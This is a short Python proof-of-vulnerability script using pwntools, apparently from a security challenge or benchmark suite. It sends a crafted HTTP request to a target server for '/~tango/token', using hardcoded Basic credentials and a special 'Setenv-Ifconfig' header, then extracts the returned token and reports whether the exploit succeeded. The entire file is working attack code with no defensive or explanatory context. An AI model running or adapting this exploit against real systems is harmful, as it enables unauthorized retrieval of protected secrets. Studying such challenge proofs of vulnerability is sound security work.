import sys
import struct
import requests
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
from pwn import *

def handler( signum, frame):
    print('sigalrm fired - time ran out')
    print('[ERROR] POV Failed')
    exit(0)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    print('Host ' + os.environ['HOST'] + ' and PORT: ' + os.environ['PORT'])

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)

    p = remote(HOST, PORT)

    data = 'GET /~tango/token HTTP/1.1\r\n' 
    data += 'Host: ' + HOST + ':' + str(PORT) + '\r\n'
    data += 'Connection: keep-alive\r\n'
    data += 'Cache-Control: max-age=0\r\n'
    data += 'Authorization: Basic Y2hlc3M6Y2hlc3M=\r\n' #chess:chess
    data += 'Upgrade-Insecure-Requests: 1\r\n'
    data += 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36\r\n'
    data += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    data += 'Sec-GPC: 1\r\n'
    data += 'Setenv-Ifconfig: user\r\n'
    data += 'Accept-Encoding: gzip, deflate\r\n'
    data += 'Accept-Language: en-US,en;q=0.9\r\n\r\n'
    p.send(data)

    d = p.recv().decode('utf-8')
    #print(d)
    f = d.find("200 OK")
    if f > 0:
        p.close()
        lines = d.splitlines()
        print('TOKEN='+ lines[10])
        print('[SUCCESS] POV Succeeded')
        exit(0)
    print('[FAILED] POV Failed')
    

if __name__ == '__main__':
    main()